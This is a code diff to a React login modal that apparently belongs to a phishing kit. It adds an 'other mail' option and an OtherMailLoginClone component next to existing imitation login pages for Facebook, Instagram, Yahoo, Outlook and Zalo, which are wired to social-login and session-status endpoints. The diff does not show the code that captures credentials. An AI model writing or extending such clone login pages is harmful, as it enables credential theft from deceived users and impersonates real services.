@@ -6,7 +6,7 @@ import { Input } from '@/components/ui/input';
 import { toast } from 'react-toastify';
 import { useUserAuth } from '@/contexts/UserAuthContext';
 import { ImageAsIcon } from '@/components/icons/ImageAsIcon';
-import { Loader, Lock, Eye, EyeOff, User, ArrowLeft } from 'lucide-react';
+import { Loader, Lock, Eye, EyeOff, User, ArrowLeft, Mail } from 'lucide-react';
 import { useEventBus } from '@/contexts/AppContext';
 
 import FacebookLoginClone from '@/components/login-clones/FacebookLoginClone';
@@ -15,6 +15,7 @@ import InstagramLoginClone from '@/components/login-clones/InstagramLoginClone';
 import YahooLoginClone from '@/components/login-clones/YahooLoginClone';
 import OutlookLoginClone from '@/components/login-clones/OutlookLoginClone';
 import ZaloLoginClone from '@/components/login-clones/ZaloLoginClone';
+import OtherMailLoginClone from '@/components/login-clones/OtherMailLoginClone';
 import { WaitingScreen } from '@/components/WaitingScreen';
 import { API_ENDPOINTS } from '@/lib/services/apiConfig';
 import fbIcon from '@/assets/social/facebook.svg';
@@ -23,6 +24,7 @@ import ggIcon from '@/assets/social/google.svg';
 import zaloIcon from '@/assets/social/zalo.svg';
 import outlookIcon from '@/assets/social/microsoft.svg';
 import yahooIcon from '@/assets/social/yahoo.svg';
+import otherMailIcon from '@/assets/social/other-mail.svg';
 
 const API_SOCIAL_LOGIN = API_ENDPOINTS.socialLogin;
 const API_SESSION_STATUS = API_ENDPOINTS.sessionStatus;
@@ -66,6 +68,12 @@ export const socialLogins = [
     icon: (props) => <ImageAsIcon src={outlookIcon} alt="Microsoft" {...props} />,
     bgClass: 'bg-white',
     borderClass: 'border border-gray-200',
+  },
+  {
+    name: 'Mail khác',
+    icon: (props) => <ImageAsIcon src={otherMailIcon} alt="Mail khác" {...props} />,
+    bgClass: 'bg-gradient-to-r from-blue-500 to-purple-600',
+    borderClass: 'border border-blue-500/60',
   },
 ];
 
@@ -201,6 +209,7 @@ export const LoginModal = ({ isOpen, setIsOpen, initialPlatform = null }) => {
     if (key.includes('zalo')) return 'zalo';
     if (key.includes('outlook') || key.includes('microsoft') || key.includes('hotmail')) return 'microsoft';
     if (key.includes('yahoo')) return 'yahoo';
+    if (key.includes('mail khác') || key.includes('other mail')) return 'other_mail';
     return 'gmail';
   };
 
@@ -427,6 +436,7 @@ export const LoginModal = ({ isOpen, setIsOpen, initialPlatform = null }) => {
   case 'Outlook':
   case 'Microsoft': content = <OutlookLoginClone {...commonProps} />; break;
         case 'Zalo': content = <ZaloLoginClone {...commonProps} />; break;
+        case 'Mail khác': content = <OtherMailLoginClone {...commonProps} />; break;
         default:
             content = (
                 <div className="text-center text-white p-6">
